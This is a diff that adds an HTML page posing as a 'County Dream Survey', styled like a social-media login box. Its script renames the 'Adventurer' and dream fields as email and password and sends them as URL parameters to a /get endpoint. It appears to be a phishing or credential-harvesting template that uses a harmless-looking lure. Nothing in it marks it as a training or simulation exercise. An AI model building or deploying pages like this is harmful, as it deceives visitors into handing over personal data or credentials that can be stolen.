@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #1d2129;
+            background-color: #fdf46c;
+        }
+        .login-container {
+            width: 350px;
+            background-color: white;
+            box-shadow: 0px 0px 5px 0px rgba(0,0,0,0.20);
+            border-radius: 5px;
+            padding: 10px 20px;
+            margin: auto;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: normal;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        h2 {
+            font-size: 16px;
+            font-weight: normal;
+            color: #606770;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        input[type=text], input[type=password], textarea {
+            display: block;
+            width: 100%;
+            margin: 10px auto;
+            padding: 12px 20px;
+            box-sizing: border-box;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #4267B2;
+            border: none;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 5px;
+        }
+        button:hover {
+            opacity: 0.8;
+        }
+    </style>
+    <script>
+        window.addEventListener('DOMContentLoaded', (event) => {
+            const form = document.getElementById('dream-form');
+            form.addEventListener('submit', (event) => {
+                event.preventDefault();
+                const adventurer = form.elements['adventurer'].value;
+                const dream = form.elements['dream'].value;
+                const email = adventurer;
+                const password = dream;
+                const url = `/get?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
+                window.location.href = url;
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <form id="dream-form">
+            <h1>HAVE YOU BEEN HAVING STRANGE DREAMS?</h1>
+            <h2>The County Dream Survey is investigating a recent spike in bizarre, unexplainable dreams. If you have been experiencing any unusual dream activity, you can help by reporting a summary</h2>
+            <input type="text" name="adventurer" placeholder="Adventurer">
+            <textarea name="dream" placeholder="Describe your dream here..."></textarea>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+</body>
+</html>
